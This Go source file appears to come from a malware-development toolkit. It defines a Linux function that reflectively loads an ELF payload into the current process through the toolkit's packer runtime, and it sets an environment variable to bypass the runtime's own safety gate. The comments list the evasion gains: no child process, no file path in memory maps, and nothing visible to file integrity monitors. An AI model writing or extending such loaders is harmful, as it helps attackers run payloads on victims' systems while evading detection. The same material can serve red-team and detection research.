//go:build linux

package main

import (
	"fmt"
	"os"

	"github.com/oioio-space/maldev/pe/packer/runtime"
)

// executePayloadReflective loads payload in-process via the existing
// pe/packer/runtime mapper + entry-point trampoline. The payload's
// PT_LOAD segments get mmap'd into our address space, R_X86_64_RELATIVE
// relocations applied, per-segment mprotect set, then a hand-rolled asm
// trampoline patches a fresh kernel auxv frame and jumps to the entry
// point.
//
// vs. memfd+execve (executePayload):
//   - Process tree shows ONE binary — no execve, no child.
//   - /proc/self/maps does NOT carry a file path for the payload region
//     (anonymous mapping).
//   - No transient FD or temp inode visible to file integrity monitors.
//   - Trade-off: payload must be a Linux ELF this loader supports
//     (static-PIE x86-64; Phase 1f Stage E coverage).
//
// The runtime.PreparedImage.Run() function gates itself behind a
// MALDEV_PACKER_RUN_E2E env var so it can't fire by accident in
// processes that happen to import the package. The reflective launcher
// IS the legitimate caller, so we set the gate ourselves before
// invoking. This is an internal contract — do not rely on the env var
// staying as the gate signal long-term.
func executePayloadReflective(payload []byte, _ []string) error {
	if err := os.Setenv("MALDEV_PACKER_RUN_E2E", "1"); err != nil {
		return fmt.Errorf("setenv: %w", err)
	}
	img, err := runtime.Prepare(payload)
	if err != nil {
		return fmt.Errorf("runtime.Prepare: %w", err)
	}
	// Run() takes over the OS thread and never returns on the happy
	// path — the loaded binary's exit_group syscall reaps the whole
	// process. Returning means failure mid-setup.
	return img.Run()
}
